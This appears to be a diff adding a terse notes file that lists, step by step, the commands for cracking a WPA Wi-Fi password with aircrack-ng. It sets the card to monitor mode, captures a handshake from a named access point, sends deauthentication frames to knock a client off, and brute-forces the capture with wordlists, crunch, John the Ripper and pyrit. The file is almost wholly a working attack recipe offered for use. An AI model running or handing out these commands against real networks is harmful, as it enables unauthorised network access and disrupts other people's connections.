@@ -1,0 +1,18 @@
+1. airmon-ng check kill
+
+2. ifconfig wlan0 down
+
+3. airmon-ng start wlan0
+
+4. airodump-ng mon0
+
+5. airodump-ng --bssid 08:86:30:74:22:76 -c 6 --write WPAcrack mon0
+5.1 In an other terminal to make it faster
+   aireplay-ng -0 2 -a {BSSID} -c {STATION} mon0
+5.2 At the top-right of the terminal going to appear: WPA handshake {BSSID}
+
+6.a. aircrack-ng WPAcrack-01.cap -w darkc0de.lst
+6.b. crunch 5 10 'abcdef ghi...' | aircrack-ng WPAcrack-01.cap -w - -e {BSSID}
+6.c.I.  john --incremental=all --stdout | aircrack-ng WPAcrack-03.cap  -w - -b 30:91:8F:72:45:69
+6.c.II. john --incremental=all --stdout | pyrit -r WPAcrack-03.cap -b {BSSID} -i - attack_passthrough
+
